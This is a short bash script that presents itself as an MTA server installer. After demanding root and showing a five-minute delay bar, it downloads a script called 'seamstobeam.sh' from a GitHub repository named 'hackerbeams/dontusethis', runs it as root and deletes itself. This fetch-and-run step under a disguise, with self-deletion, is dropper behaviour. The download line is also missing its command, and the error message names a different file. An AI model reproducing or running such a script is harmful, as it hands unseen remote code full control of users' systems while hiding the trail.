#!/bin/bash

 
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root."
    exit 1
fi

 
function progress_bar() {
    local duration="$1"
    local total_width=50
    local sleep_time=$(echo "scale=2; $duration / $total_width" | bc)

    for ((i = 0; i <= $total_width; i++)); do
        echo -ne "\r["
        for ((j = 0; j < $i; j++)); do
            echo -ne "="
        done
        for ((j = $i; j < $total_width; j++)); do
            echo -ne " "
        done
        echo -ne "] $((i * 2))%"
        sleep "$sleep_time"
    done
    echo -ne "\n"
}

 
timer_duration=$((5 * 60))

 
echo "=============================="
echo "   MTA Server Installation"
echo "=============================="
echo "This script will install the MTA server and configure it."

 
echo "Installation will begin in 5 minutes."
progress_bar "$timer_duration"

 
https://raw.githubusercontent.com/hackerbeams/dontusethis/main/seamstobeam.sh -O seamstobeam.sh

 
if [ $? -ne 0 ]; then
    echo "Failed to download installmta.sh script. Exiting."
    exit 1
fi

 
chmod +x seamstobeam.sh

 
./seamstobeam.sh

 
 
  rm -f "$0"
